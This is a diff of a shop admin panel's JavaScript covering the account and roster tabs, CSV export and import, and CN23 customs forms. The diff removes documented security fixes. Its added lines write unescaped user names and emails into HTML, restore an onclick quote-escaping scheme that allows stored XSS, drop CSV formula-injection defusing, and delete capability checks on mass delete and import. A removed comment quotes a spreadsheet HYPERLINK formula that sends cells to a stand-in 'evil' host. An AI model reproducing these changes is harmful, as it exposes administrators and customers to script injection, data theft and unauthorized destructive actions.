     else if (tab === 'vault' && typeof renderAdminVault === 'function') await renderAdminVault();
@@ -12679,34 +12271,6 @@ function startAdminAutoRefresh() {
     });
     ADMIN_REFRESH.wired = true;
   }
-}
-
-// Phase 7.16: the account-level mutations below (approve, deny, unlimited,
-// ban, unban, delete, bulk delete) are driven from BOTH the old Accounts tab
-// and the new Customers tab. Repaint whichever surface the admin is actually
-// looking at. Repainting Accounts unconditionally would leave Customers
-// showing pre-change data while re-rendering a hidden table for nothing.
-async function adminRefreshPeopleSurfaces() {
-  // Invalidate BOTH caches, always. Only the visible surface is repainted, but
-  // the hidden one must not keep serving pre-mutation rows: its cached array
-  // still carries live Approve / Ban / Delete buttons bound to ids that may no
-  // longer exist, and the Accounts edit modal reads that cache rather than the
-  // database.
-  if (typeof _customersState !== 'undefined') {
-    _customersState._useCache = false;
-    _customersState._cache    = null;
-    _customersState._profile  = null;
-    _customersState._member   = null;
-  }
-  if (typeof _adminAccountsState !== 'undefined') {
-    _adminAccountsState._useCache = false;
-    _adminAccountsState._cache    = null;
-  }
-  if (ADMIN_CURRENT_TAB === 'customers' && typeof renderAdminCustomers === 'function') {
-    await renderAdminCustomers();
-    return;
-  }
-  if (typeof renderAdminAccounts === 'function') await renderAdminAccounts();
 }
 
 function stopAdminAutoRefresh() {
@@ -12788,23 +12352,18 @@ async function renderAdminAccounts() {
           ? `<td></td>`
           : `<td><input type="checkbox" class="admin-row-check" data-user-id="${p.id}" data-user-email="${escapeHtml(p.email || '')}" data-user-name="${escapeHtml(((p.first_name||'')+' '+(p.last_name||'')).trim())}" onclick="updateBulkBar()" aria-label="Select row"></td>`;
         // Action buttons: Approve/Deny same as before, plus Ban/Unban, plus Delete (skip Delete + Ban for admins)
-        // Phase 7.16: nothing user-supplied goes into these inline handlers.
-        // The old `escapeHtml(x).replace(/'/g,"\\'")` could not work: escapeHtml
-        // had already turned the quote into &#39;, so the replace matched
-        // nothing, and the parser decoded it back to a real quote before the
-        // handler was compiled. A registrant whose first name contained a
-        // quote could close the string and run script in the admin's session.
-        // Only the uuid is interpolated now; identity comes from the cache.
+        const safeEmail = escapeHtml(p.email || '').replace(/'/g, "\\'");
+        const safeName = escapeHtml(((p.first_name||'')+' '+(p.last_name||'')).trim()).replace(/'/g, "\\'");
         const deleteBtn = isAdmin
           ? ''
-          : `<button class="btn btn-danger btn-sm" onclick="adminAccountsDelete('${p.id}')">${t('btn_delete')}</button>`;
+          : `<button class="btn btn-danger btn-sm" onclick="openDeleteAccountModal('${p.id}', '${safeEmail}', '${safeName}')">${t('btn_delete')}</button>`;
         // Phase 6.49c.2: standalone Ban / Unban button (skip for admins)
         let banBtn = '';
         if (!isAdmin) {
           if (isBanned) {
-            banBtn = `<button class="btn btn-ghost btn-sm" style="color:var(--gold-ink);border-color:var(--gold-ink)" onclick="adminAccountsUnban('${p.id}')">${t('btn_unban')}</button>`;
+            banBtn = `<button class="btn btn-ghost btn-sm" style="color:var(--gold-ink);border-color:var(--gold-ink)" onclick="adminUnbanEmail('${safeEmail}')">${t('btn_unban')}</button>`;
           } else {
-            banBtn = `<button class="btn btn-ghost btn-sm" style="color:#8b2a2a;border-color:rgba(139,42,42,0.5)" onclick="adminAccountsBan('${p.id}')">${t('btn_ban')}</button>`;
+            banBtn = `<button class="btn btn-ghost btn-sm" style="color:#8b2a2a;border-color:rgba(139,42,42,0.5)" onclick="openBanAccountModal('${p.id}','${safeEmail}','${safeName}')">${t('btn_ban')}</button>`;
           }
         }
         const accClr = p.unlimited_access ? 'color:var(--gold-ink);border-color:var(--gold-ink)' : 'color:var(--cream);border-color:var(--line2)';
@@ -12818,8 +12377,8 @@ async function renderAdminAccounts() {
           : `<span class="status-badge status-${p.status}">${t('status_'+p.status)||p.status}</span>`;
         return `<tr>
           ${checkboxCell}
-          <td><strong style="color:var(--cream)">${escapeHtml(p.first_name||'')} ${escapeHtml(p.last_name||'')}</strong>${p.facebook_name ? `<br><span style="font-size:10px;color:var(--gold-ink);font-family:'DM Mono',monospace">fb: ${escapeHtml(p.facebook_name)}</span>` : ''}${(p.city||p.country) ? `<br><span style="font-size:11px;color:var(--cream-dim)">${escapeHtml([p.city,p.country].filter(Boolean).join(', '))}</span>` : ''}${isAdmin ? `<br><span style="font-size:10px;color:var(--gold-ink);font-family:'DM Mono',monospace">admin</span>` : ''}</td>
-          <td>${escapeHtml(p.email||'')}</td>
+          <td><strong style="color:var(--cream)">${p.first_name||''} ${p.last_name||''}</strong>${p.facebook_name ? `<br><span style="font-size:10px;color:var(--gold-ink);font-family:'DM Mono',monospace">fb: ${p.facebook_name}</span>` : ''}<br><span style="font-size:11px;color:var(--cream-dim)">${p.city||''}, ${p.country||''}</span>${isAdmin ? `<br><span style="font-size:10px;color:var(--gold-ink);font-family:'DM Mono',monospace">admin</span>` : ''}</td>
+          <td>${p.email}</td>
           <td>${statusBadgeHtml}</td>
           <td style="font-size:11px;color:var(--cream-dim);white-space:nowrap">${_fmtJoined(p.created_at)}</td>
           <td>${flagHtml||'—'}</td>
@@ -13399,18 +12958,9 @@ function escapeHtml(s) {
 // Always doubles internal quotes.
 function csvCell(v) {
   if (v == null) return '';
-  return '"' + _csvDefuse(String(v)).replace(/"/g, '""') + '"';
-}
-
-// Phase 7.16: CSV injection. Quoting makes a cell valid CSV; it does not stop
-// Excel or Sheets EXECUTING it. A cell opening with = + - @ (or tab/CR, which
-// they skip before parsing) is read as a formula, so a name typed at signup
-// like =HYPERLINK("http://evil/?d="&CONCAT(B2:B400),"Order details") turns the
-// owner's own customer export into an exfiltration link, and the DDE form runs
-// commands. Prefixing an apostrophe forces text; the roster importer strips it
-// again so export -> edit -> import still round-trips.
-function _csvDefuse(s) {
-  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+  const s = String(v);
+  // Always quote to be safe across Excel locales — Excel handles quoted cells uniformly.
+  return '"' + s.replace(/"/g, '""') + '"';
 }
 
 // Convert a 2D array of rows into a CSV string and trigger a download.
@@ -14617,14 +14167,9 @@ function normalizeCustomsPacking(packing) {
       tare_grams: b && b.tare_grams != null ? Number(b.tare_grams) : 0,
       contents_override_grams: b && b.contents_override_grams != null
         ? Number(b.contents_override_grams) : null,
-      // Phase 7.15b: each box travels as its own parcel with its own CN23, so
-      // the tracking number belongs to the box, not the order. Empty normalises
-      // to null so "not known yet" and "typed then cleared" are the same state.
-      tracking_number: b && b.tracking_number != null && String(b.tracking_number).trim()
-        ? String(b.tracking_number).trim() : null,
     }))
     .filter(b => Number.isFinite(b.n) && b.n >= 1);
-  if (!boxes.length) boxes = [{ n: 1, tare_grams: 0, contents_override_grams: null, tracking_number: null }];
+  if (!boxes.length) boxes = [{ n: 1, tare_grams: 0, contents_override_grams: null }];
   boxes.sort((a, b) => a.n - b.n);
   const alloc = (p.alloc && typeof p.alloc === 'object') ? p.alloc : {};
   return { boxes, alloc };
@@ -14769,7 +14314,6 @@ function computeCustomsData(orderItems, packingRaw) {
       tareGrams,
       totalGrams: contentsGrams + tareGrams,
       valueEuros: acc.valueEuros,
-      trackingNumber: b.tracking_number || null,
       // Phase 7.11: always CN23, whatever the box is worth. See the note on
       // the order-level declaration below.
       recommendedForm: t('customs_form_cn23'),
@@ -14915,12 +14459,6 @@ async function renderCustomsPanel(orderDbId) {
         <div><input type="number" class="cx-tare customs-mini-input" data-box="${b.n}" min="0" step="1" value="${b.tareGrams}" oninput="customsRecalc('${orderDbId}')"> g</div>
         <label><strong>${t('customs_box_total')}</strong></label>
         <div><strong data-cx="bt-${b.n}">${fmtGrams(b.totalGrams)}</strong></div>
-        <label>${t('customs_box_tracking')}</label>
-        <div>
-          <input type="text" class="cx-track" data-box="${b.n}" value="${escapeHtml(b.trackingNumber || '')}"
-                 placeholder="${escapeHtml(t('customs_box_tracking_ph'))}"
-                 style="width:100%;max-width:260px;padding:5px 6px;background:rgba(42,31,21,0.04);border:1px solid rgba(42,31,21,0.12);color:var(--cream);border-radius:4px;font-family:'DM Mono',monospace;font-size:12px">
-        </div>
       </div>
     </div>`).join('');
   // Render — Phase 6.29.6: all data-t converted to inline t() so we
@@ -15094,9 +14632,7 @@ function collectCustomsForm(orderDbId) {
     if (contEl && contEl.dataset.manual === '1' && contEl.value.trim() !== '') {
       override = num(contEl, 0);
     }
-    const trackEl = panel.querySelector(`.cx-track[data-box="${n}"]`);
-    const track = trackEl ? trackEl.value.trim() : '';
-    return { n, tare_grams: tare, contents_override_grams: override, tracking_number: track || null };
+    return { n, tare_grams: tare, contents_override_grams: override };
   });
   return { weights, lines, boxes, alloc, boxNums };
 }
@@ -15267,7 +14803,7 @@ async function customsAddBox(orderDbId) {
     return;
   }
   const next = (form.boxNums.length ? Math.max.apply(null, form.boxNums) : 0) + 1;
-  const boxes = form.boxes.concat([{ n: next, tare_grams: 0, contents_override_grams: null, tracking_number: null }]);
+  const boxes = form.boxes.concat([{ n: next, tare_grams: 0, contents_override_grams: null }]);
   await saveCustomsPacking(orderDbId, { boxes, alloc: form.alloc });
 }
 
@@ -16598,71 +16134,25 @@ async function generateCn23Pdf(orderDbId) {
   // Sendungsnummer box always came out blank, which is the one moment the form
   // actually needs it.
   //
-  // Nothing here changes the order's status or stamps shipped_at. Recording a
-  // number is not the same event as shipping, and shipped_at has to stay a
-  // true audit field.
+  // The answer is written to the order as tracking_number ONLY - no status
+  // change, no shipped_at. Recording the number is not the same event as
+  // shipping, and shipped_at has to stay a true audit field.
   //
-  // Phase 7.15b: one CN23 per box means one tracking number per box, so this
-  // asks per box rather than once per order. A number already entered in the
-  // Customs Data panel is used as it stands and is never asked for again.
-  //
-  // Cancel stops the asking for the rest of the set: on a five-box order the
-  // admin should be able to bail out after the first, not click through four
-  // more dialogs.
-  const askedBoxes = [];
-  for (const b of boxes) {
-    if (String(b.trackingNumber || '').trim()) continue;
-    const typed = boxes.length > 1
-      ? prompt(t('cn23_tracking_prompt_box').replace('{n}', b.n).replace('{total}', boxes.length), '')
-      : prompt(t('cn23_tracking_prompt'), '');
-    if (typed == null) break;
-    const entered = String(typed).trim();
-    if (!entered) continue;
-    // Set locally first: a failed save must not cost the admin the print.
-    b.trackingNumber = entered;
-    askedBoxes.push(b.n);
-  }
-  if (askedBoxes.length) {
-    // Write the numbers back onto the packing record, carrying every other
-    // field through untouched. customs.packing is the normalised copy, so the
-    // allocation and the weights come along exactly as stored.
-    const packing = {
-      boxes: customs.packing.boxes.map(pb => {
-        const drawn = boxes.find(b => b.n === pb.n);
-        return Object.assign({}, pb, { tracking_number: (drawn && drawn.trackingNumber) || pb.tracking_number || null });
-      }),
-      alloc: customs.packing.alloc,
-    };
-    const writes = [sb.from('orders').update({ customs_packing: packing }).eq('id', orderDbId).select('id')];
-    // Box 1 is also the order-level tracking number, because the customer's
-    // shipping email carries exactly one link and the first parcel is the one
-    // to point it at. Only filled when the order has none: an already-recorded
-    // number is the admin's, not ours to overwrite.
-    const first = boxes.find(b => b.n === Math.min.apply(null, boxes.map(x => x.n)));
-    const firstNo = first && String(first.trackingNumber || '').trim();
-    if (firstNo && !String(order.tracking_number || '').trim()) {
-      order.tracking_number = firstNo;
-      writes.push(sb.from('orders').update({ tracking_number: firstNo }).eq('id', orderDbId).select('id'));
-    }
-    // .select('id') on both: an update filtered out by row-level security
-    // reports success with zero rows, which is how a session of typed weights
-    // was lost once already (see the Phase 7.12 note in saveCustomsPacking).
-    const results = await Promise.all(writes);
-    const failed = results.find(r => r && r.error);
-    const wroteNothing = results.filter(r => r && !r.error && (!Array.isArray(r.data) || r.data.length === 0));
-    // No renderAdminOrders() here on purpose - it rebuilds the table with
-    // every detail row collapsed, and the admin is standing in the one they
-    // just printed from. The numbers show up on the next render.
-    if (failed) {
-      alert(t('cn23_tracking_save_failed').replace('{msg}', failed.error.message));
-    } else if (wroteNothing.length) {
-      alert(t('cn23_tracking_save_failed').replace('{msg}', t('cn23_tracking_save_blocked')));
-    } else {
-      // If the Customs Data panel is open behind this, repaint just that panel
-      // so its tracking fields show what was entered. renderCustomsPanel is
-      // panel-local, unlike renderAdminOrders.
-      const cxPanel = document.getElementById('customs-panel-' + orderDbId);
-      if (cxPanel && cxPanel.style.display !== 'none') renderCustomsPanel(orderDbId);
+  // Single box only, for the same reason the field below is left blank on a
+  // multi-box set: one number stamped on N sheets is a false declaration on
+  // N-1 of them.
+  if (boxes.length === 1 && !String(order.tracking_number || '').trim()) {
+    const typed = prompt(t('cn23_tracking_prompt'), '');
+    const entered = String(typed == null ? '' : typed).trim();
+    if (entered) {
+      // Set locally first: a failed save must not cost the admin the print.
+      order.tracking_number = entered;
+      const { error: trackErr } = await sb.from('orders')
+        .update({ tracking_number: entered }).eq('id', orderDbId);
+      // No renderAdminOrders() here on purpose - it rebuilds the table with
+      // every detail row collapsed, and the admin is standing in the one they
+      // just printed from. The number shows up on the next render.
+      if (trackErr) alert(t('cn23_tracking_save_failed').replace('{msg}', trackErr.message));
     }
   }
 
@@ -16779,13 +16269,10 @@ function _cn23DrawPage(doc, order, customs, box, boxCount, s, kg, clippedFields,
   // ── Parcel number ───────────────────────────────────────────────────
   lab(41.4, 223.2, L.parcelNo);
   line(41.4, 223.2, 528.0, 35.6);
-  // Phase 7.15b: this sheet travels with THIS box, so it carries this box's
-  // own number. The order-level tracking number is only a fallback for a
-  // single-box order, where the two are the same parcel by definition - on a
-  // multi-box set it belongs to box 1 alone, and stamping it on every sheet
-  // would be a false declaration on all but one of them.
-  const parcelNo = String(box.trackingNumber || '').trim() ||
-    (boxCount === 1 ? String(order.tracking_number || '').trim() : '');
+  // Only when there is exactly one box. One tracking number stamped on N
+  // sheets would be a false declaration on N-1 of them, so multi-box is left
+  // blank for the label numbers to be written on by hand.
+  const parcelNo = (boxCount === 1 && order.tracking_number) ? order.tracking_number : '';
   val(47, 245, parcelNo, 10, 518, 1, 'Sendungsnummer');
 
   // ── Addressee ───────────────────────────────────────────────────────
@@ -16959,7 +16446,7 @@ async function adminSetStatus(userId, status) {
   if (status === 'approved' || status === 'denied') {
     sendEmailNotification('account_' + status, { userId });
   }
-  await adminRefreshPeopleSurfaces();
+  await renderAdminAccounts();
 }
 
 // Phase 6.56j: toggle a member's unlimited-access flag (waives quantity + LE caps).
@@ -16967,7 +16454,7 @@ async function adminSetUnlimited(userId, val) {
   if (!requireCapability('can_manage_members')) return;
   const { error } = await sb.from('profiles').update({ unlimited_access: !!val }).eq('id', userId);
   if (error) { alert('Could not update: ' + error.message); return; }
-  await adminRefreshPeopleSurfaces();
+  await renderAdminAccounts();
 }
 
 // ════════════════════════════════════════════════════════════════════════
@@ -16980,30 +16467,6 @@ async function adminSetUnlimited(userId, val) {
 // ════════════════════════════════════════════════════════════════════════
 
 // --- Single-user delete ---
-
-// Phase 7.16: resolve identity from the cached row rather than trusting values
-// smuggled through an inline handler. Same shape as the Customers tab's
-// _custRowFor. If the row is not in the cache the action simply does nothing,
-// which is the safe outcome for a destructive button.
-function _adminAccountRow(userId) {
-  const list = (_adminAccountsState && _adminAccountsState._cache) || [];
-  return list.find(x => String(x.id) === String(userId)) || null;
-}
-function adminAccountsDelete(userId) {
-  const p = _adminAccountRow(userId);
-  if (!p) return;
-  openDeleteAccountModal(p.id, p.email || '', ((p.first_name||'')+' '+(p.last_name||'')).trim());
-}
-function adminAccountsBan(userId) {
-  const p = _adminAccountRow(userId);
-  if (!p) return;
-  openBanAccountModal(p.id, p.email || '', ((p.first_name||'')+' '+(p.last_name||'')).trim());
-}
-function adminAccountsUnban(userId) {
-  const p = _adminAccountRow(userId);
-  if (!p || !p.email) return;
-  adminUnbanEmail(p.email);
-}
 
 function openEditAccountModal(userId) {
   const modal = document.getElementById('editAccountModal');
@@ -17053,7 +16516,6 @@ async function saveEditAccount() {
   await renderAdminAccounts();
 }
 function openDeleteAccountModal(userId, email, name) {
-  if (!requireCapability('can_manage_members')) return;  // Phase 7.16
   const modal = document.getElementById('deleteAccountModal');
   if (!modal) return;
   // Reset state
@@ -17123,8 +16585,7 @@ async function doDeleteAccount() {
     return;
   }
   closeDeleteAccountModal();
-  if (typeof _customersState !== 'undefined') _customersState.openKey = null;  // the person we were looking at is gone
-  await adminRefreshPeopleSurfaces();
+  await renderAdminAccounts();
 }
 
 // ════════════════════════════════════════════════════════════════════════
@@ -17187,7 +16648,7 @@ async function doBanAccount() {
     }
     btn.innerHTML = `<span>${t('btn_ban_account')}</span>`;
     closeBanAccountModal();
-    await adminRefreshPeopleSurfaces();
+    await renderAdminAccounts();
   } catch (e) {
     console.error('[ban] failed:', e);
     btn.innerHTML = `<span>${t('btn_ban_account')}</span>`;
@@ -17208,7 +16669,7 @@ async function adminUnbanEmail(email) {
       .delete()
       .eq('email', email.toLowerCase());
     if (error) throw error;
-    await adminRefreshPeopleSurfaces();
+    await renderAdminAccounts();
   } catch (e) {
     console.error('[unban] failed:', e);
     alert(t('unban_failed') + (e.message || e));
@@ -17217,14 +16678,11 @@ async function adminUnbanEmail(email) {
 
 // --- Bulk delete ---
 
-function openBulkDeleteModal(selector) {
+function openBulkDeleteModal() {
   // Phase 6.56a: Owner-only — bulk-delete + optional bulk-ban of accounts is
   // catastrophic. Even can_manage_members admins cannot perform this.
   if (!isOwner()) { try { alert(t('cap_required_msg')); } catch (e) {} return; }
-  // Phase 7.16: the Customers table uses .cust-row-check so its checkboxes and
-  // bulk bar cannot collide with the Accounts table's ids while both tabs are
-  // rendered. Callers pass their own selector; Accounts keeps the default.
-  const checked = document.querySelectorAll((selector || '.admin-row-check') + ':checked');
+  const checked = document.querySelectorAll('.admin-row-check:checked');
   if (checked.length === 0) return;
   const modal = document.getElementById('bulkDeleteModal');
   if (!modal) return;
@@ -17249,10 +16707,8 @@ function openBulkDeleteModal(selector) {
     email: cb.dataset.userEmail,
     name: cb.dataset.userName || '(no name)',
   }));
-  // dataset.* returns the DECODED original string, so the escaping done when
-  // the attribute was written does not carry over to this innerHTML.
   document.getElementById('bulkDeleteList').innerHTML = list.map(item =>
-    `<div><strong style="color:var(--cream)">${escapeHtml(item.name)}</strong> <span style="color:var(--cream-dim);font-family:'DM Mono',monospace;font-size:12px">${escapeHtml(item.email)}</span></div>`
+    `<div><strong style="color:var(--cream)">${item.name}</strong> <span style="color:var(--cream-dim);font-family:'DM Mono',monospace;font-size:12px">${item.email}</span></div>`
   ).join('');
   // Stash the list for doBulkDelete to pick up
   document.getElementById('bulkDeleteBtn').dataset.users = JSON.stringify(list);
@@ -17307,11 +16763,11 @@ async function doBulkDelete() {
     btn.disabled = false;
     progress.style.display = 'none';
     showAlert(err, `${failures.length} ${t('bulk_failed_count')}: ${failures.map(f => f.email).join(', ')}`);
-    await adminRefreshPeopleSurfaces();
+    await renderAdminAccounts();
     return;
   }
   closeBulkDeleteModal();
-  await adminRefreshPeopleSurfaces();
+  await renderAdminAccounts();
 }
 
 // ════════════════════════════════════════════════════════════════════════
@@ -17385,7 +16841,6 @@ async function renderAdminHistory() {
 // --- Unban flow ---
 
 function openUnbanModal(email) {
-  if (!requireCapability('can_manage_members')) return;  // Phase 7.16: ban requires it, so unban must too
   const modal = document.getElementById('unbanModal');
   if (!modal) return;
   document.getElementById('unbanError').classList.remove('show');
@@ -17423,11 +16878,6 @@ async function doUnban() {
   }
   closeUnbanModal();
   await renderAdminHistory();
-  // Phase 7.16: the Customers tab routes its Unban button here (the audited
-  // path), so refresh it too when that is where the admin is standing.
-  if (ADMIN_CURRENT_TAB === 'customers' && typeof adminRefreshPeopleSurfaces === 'function') {
-    await adminRefreshPeopleSurfaces();
-  }
 }
 
 // ═══════════════════════════════════════════════════════════════════════
@@ -19382,17 +18832,6 @@ async function adminMembersImportConfirm() {
 
 async function adminMembersFinishImport() {
   adminMembersCloseImport();
-  // Phase 7.16: the import can be launched from either tab, and repainting the
-  // hidden one leaves the visible list showing the pre-import roster. Ask which
-  // tab is actually on screen NOW rather than trusting a flag set when the
-  // modal opened - closing an import without finishing it left that flag set,
-  // so the next import from the Members tab repainted the wrong surface and
-  // looked like it had done nothing.
-  if (ADMIN_CURRENT_TAB === 'customers') {
-    if (typeof _customersState !== 'undefined') _customersState._useCache = false;
-    await adminRefreshPeopleSurfaces();
-    return;
-  }
   await renderAdminMembers();
 }
 
@@ -20762,9 +20201,8 @@ function _adminMembersBuildCsv(rows, includeDeleted) {
   // Quote helper: wrap in double quotes, escape internal quotes
   const q = (v) => {
     if (v == null) return '';
-    // Same formula-injection defusing as csvCell(); this export builds its own
-    // cells rather than going through downloadCsv().
-    return '"' + _csvDefuse(String(v)).replace(/"/g, '""') + '"';
+    const s = String(v);
+    return '"' + s.replace(/"/g, '""') + '"';
   };
   // Headers — match the importer column names
   const headers = [
@@ -20814,9 +20252,6 @@ function _adminMembersDownloadCsv(csv, filename) {
 
 async function adminMembersMassDelete() {
   if (!sb) return;
-  // Phase 7.16: this soft-deletes the ENTIRE roster and had no capability
-  // check, while deleting one row has had one since 6.56a.
-  if (!requireCapability('can_manage_members')) return;
   // Count active members
   const { data, error } = await sb
     .from('members_with_orders')
@@ -20927,13 +20362,7 @@ adminMembersParseFile = async function() {
 
     const parsed = [];
     for (let i = 1; i < rowsRaw.length; i++) {
-      // Phase 7.16: undo the apostrophe _csvDefuse() adds to any cell starting
-      // with = + - @, so a roster exported from this admin and re-imported
-      // round-trips to the same value. Only a LEADING one is stripped, and
-      // only where the next character is what triggered it, so a name that
-      // genuinely begins with an apostrophe survives.
-      const cells = (rowsRaw[i] || []).map(v =>
-        (typeof v === 'string' && /^'[=+\-@\t\r]/.test(v)) ? v.slice(1) : v);
+      const cells = rowsRaw[i];
       if (!cells || cells.every(c => !c || !c.trim())) continue;
       const name = (cells[idx.name] || '').trim();
       const email = idx.email >= 0 ? ((cells[idx.email] || '').trim() || null) : null;
@@ -21023,52 +20452,12 @@ adminMembersParseFile = async function() {
 // Wrap import confirm to include status fields in payload
 const _adminMembersOriginalImportConfirm = adminMembersImportConfirm;
 adminMembersImportConfirm = async function() {
-  // Phase 7.16: this function REPLACES the declaration further up the file,
-  // and the replacement was written without the gate the original had. An
-  // admin without can_manage_members could drive a CSV import.
-  if (!requireCapability('can_manage_members')) return;
   _memberImportState.step = 'importing';
   renderMemberImportModal();
 
   const session = (await sb.auth.getSession()).data.session;
   const createdBy = session && session.user ? session.user.email : 'unknown@import';
-  const result = { inserted: 0, updated: 0, skipped: 0, errors: [], linked: 0 };
-
-  // Phase 7.16: resolve the account link up front, in one query.
-  // members.profile_id is what the Customers tab joins on now. The old view
-  // matched on email at read time, so an imported row was linked the moment it
-  // landed; a stored link has to be written. Without this, importing someone
-  // who already has an account lists them TWICE in Customers, once as the
-  // account and once as an unlinked roster entry, which is exactly the split
-  // this tab exists to end.
-  // An email claimed by more than one account, or already claimed by another
-  // live roster row, is left unlinked rather than guessed at, matching the
-  // guard in Step 2 of the migration.
-  const _importEmails = [...new Set(_memberImportState.rows
-    .filter(r => r.status !== 'error' && r.email)
-    .map(r => String(r.email).trim().toLowerCase())
-    .filter(Boolean))];
-  const _profileByEmail = new Map();
-  if (_importEmails.length) {
-    try {
-      const { data: profs } = await sb.from('profiles').select('id, email');
-      const seen = new Map();
-      (profs || []).forEach(pr => {
-        const k = String(pr.email || '').trim().toLowerCase();
-        if (!k) return;
-        seen.set(k, seen.has(k) ? null : pr.id);   // null marks an ambiguous email
-      });
-      const { data: claimed } = await sb.from('members')
-        .select('profile_id').is('deleted_at', null).not('profile_id', 'is', null);
-      const taken = new Set((claimed || []).map(m => String(m.profile_id)));
-      _importEmails.forEach(e => {
-        const id = seen.get(e);
-        if (id && !taken.has(String(id))) _profileByEmail.set(e, id);
-      });
-    } catch (e) {
-      console.warn('[import] account link lookup failed; rows will import unlinked', e);
-    }
-  }
+  const result = { inserted: 0, updated: 0, skipped: 0, errors: [] };
 
   for (const r of _memberImportState.rows) {
     if (r.status === 'error') { result.skipped++; continue; }
@@ -21099,14 +20488,9 @@ adminMembersImportConfirm = async function() {
     if (r.membership_date) payload.membership_date = r.membership_date;
     if (r.last_order_date) payload.last_order_date_manual = r.last_order_date;
 
-    // Only set the link on INSERT. An update must not silently re-point an
-    // existing roster row that the owner may have linked by hand.
-    const _linkId = r.email ? _profileByEmail.get(String(r.email).trim().toLowerCase()) : null;
-
     try {
       if (action === 'insert') {
         payload.created_by_email = createdBy;
-        if (_linkId) { payload.profile_id = _linkId; result.linked++; }
         const { error } = await sb.from('members').insert(payload);
         if (error) throw error;
         result.inserted++;
@@ -21873,9 +21257,8 @@ function adminReportsExportInventoryCsv() {
 
   const q = (v) => {
     if (v == null) return '';
-    // Same formula-injection defusing as csvCell(); this export builds its own
-    // cells rather than going through downloadCsv().
-    return '"' + _csvDefuse(String(v)).replace(/"/g, '""') + '"';
+    const s = String(v);
+    return '"' + s.replace(/"/g, '""') + '"';
   };
 
   // Phase 6.47a: per-status columns in CSV export
@@ -24943,1457 +24326,6 @@ async function adminMarkLotteryLost(orderDbId, leId) {
 // ═══════════════════════════════════════════════════════════════════════
 // PHASE 6.56a — ADMIN CAPABILITY GATING
 // ═══════════════════════════════════════════════════════════════════════
-// PHASE 7.16 - CUSTOMERS TAB (merges Accounts + Members)
-// ═══════════════════════════════════════════════════════════════════════
-// One list of PEOPLE, whether they hold a website account, sit on the
-// hand-curated Facebook roster, or both. Backed by the customers_unified
-// view (backups/phase7.16-customers-merge.sql), which FULL OUTER JOINs
-// profiles to members on the stored members.profile_id.
-//
-// Two shapes, one container:
-//   list    - every person, one row each, sortable and filterable
-//   profile - one person, every field from both sides, plus order history
-// _customersState.openKey decides which; the render function emits one or
-// the other, never both. That avoids nesting a second .admin-table inside
-// an expandable row, which is the situation the load-bearing
-// :not(.admin-line-items-table) guards at ~4054 exist to survive.
-//
-// Naming: an "account" is a website login (profiles). A "roster entry" is
-// an owner-curated record of a person in the Facebook group (members).
-// They are different things and this tab never pretends otherwise.
-// ═══════════════════════════════════════════════════════════════════════
-
-let _customersState = {
-  openKey: null,          // row_key of the open profile, or null for the list
-  search: '',
-  filterKind: '',         // '' | 'account' | 'roster' | 'both'
-  filterAccountStatus: '',// '' | pending | approved | denied
-  filterRosterStatus: '', // '' | Active | Inactive | Banned | Other
-  filterFb: '',           // '' | Yes | No | Removed | Other
-  showDeleted: false,
-  sortField: 'display_name',
-  sortDir: 'asc',
-  showAdvanced: false,    // internal sort dates in the roster section
-  _cache: null,
-  _cacheScope: null,      // 'live' | 'all' - which fetch produced _cache
-  _useCache: false,       // one-shot: set by search/filter/sort, consumed on render
-  _profile: null,         // fresh profiles row for the open person
-  _member: null,          // fresh members row for the open person
-  _orders: null,          // orders for the open person
-  _ordersError: null,
-  _linkResults: null,     // account typeahead results when linking a roster entry
-};
-
-// The roster columns a save writes back. Kept in one place so the add form,
-// the edit form and the import all agree on the shape.
-const CUSTOMER_ROSTER_STATUSES = ['Active', 'Inactive', 'Banned', 'Other'];
-const CUSTOMER_FB_STATES       = ['Yes', 'No', 'Removed', 'Other'];
-
-// ── entry points ──────────────────────────────────────────────────────
-
-async function renderAdminCustomers() {
-  const el = document.getElementById('adminCustomers');
-  if (!el) return;
-  if (!sb) { el.innerHTML = '<p style="color:var(--cream-dim)" data-t="admin_customers_db_unavailable"></p>'; if (typeof applyT === 'function') applyT(); return; }
-  if (_customersState.openKey) {
-    const pending = _custCaptureForm();      // survive the rebuild
-    await renderCustomerProfile(el);
-    _custRestoreForm(pending);
-  } else {
-    await renderCustomersList(el);
-  }
-}
-
-// Fetch the unified list. Soft-deleted roster entries are excluded by the
-// view itself, so "show deleted" needs a second, separate read of members.
-async function _customersFetch() {
-  const scope = _customersState.showDeleted ? 'all' : 'live';
-  if (_customersState._useCache && _customersState._cache && _customersState._cacheScope === scope) {
-    return { rows: _customersState._cache, error: null };
-  }
-  const res = await sb.from('customers_unified').select('*');
-  if (res.error) return { rows: null, error: res.error };
-  let rows = res.data || [];
-  if (_customersState.showDeleted) {
-    // Trashed roster entries live outside the view (it joins them out so a
-    // trashed roster row can never hide a live account). Read them straight
-    // from the base table and shape them like view rows.
-    const del = await sb.from('members').select('*').not('deleted_at', 'is', null);
-    if (del.error) return { rows: null, error: del.error };
-    // Carry the real profile_id through. Dropping it made a trashed entry that
-    // still belongs to an account look like a standalone person, which offered
-    // the "link to an account" typeahead on a row that is already linked.
-    rows = rows.concat((del.data || []).map(m => ({
-      row_key: 'm:' + m.id,
-      profile_id: m.profile_id || null,
-      member_id: m.id,
-      kind: m.profile_id ? 'both' : 'roster',
-      display_name: m.name || m.email || '',
-      first_name: null, last_name: null, facebook_name: null, city: null, country: null,
-      primary_email: m.email, roster_email: m.email, email_mismatch: false,
-      account_status: null, unlimited_access: false, flags: null, account_created_at: null,
-      is_banned: false, ban_reason: null,
-      roster_name: m.name,
-      membership_status: m.membership_status, fb_group_member: m.fb_group_member,
-      membership_label: m.membership_label, membership_date: m.membership_date,
-      last_order_label: m.last_order_label, last_order_date_manual: m.last_order_date_manual,
-      validated: m.validated, validation_reason: m.validation_reason,
-      validated_by_email: m.validated_by_email, validated_at: m.validated_at,
-      comments: m.comments, created_by_email: m.created_by_email,
-      roster_deleted_at: m.deleted_at, roster_deleted_by_email: m.deleted_by_email,
-      order_count: 0, last_order_at: null, first_order_at: null,
-    })));
-    // A person with a live account AND a trashed roster entry would otherwise
-    // occupy two rows that contradict each other: the account row saying "not
-    // on roster", the trash row saying "no account". Fold the trashed entry
-    // into the account row instead, which is the whole point of this tab.
-    const byProfile = new Map();
-    rows.forEach(r => { if (r.profile_id && r.row_key.charAt(0) === 'p') byProfile.set(String(r.profile_id), r); });
-    rows = rows.filter(r => {
-      if (r.row_key.charAt(0) !== 'm' || !r.profile_id) return true;
-      const acct = byProfile.get(String(r.profile_id));
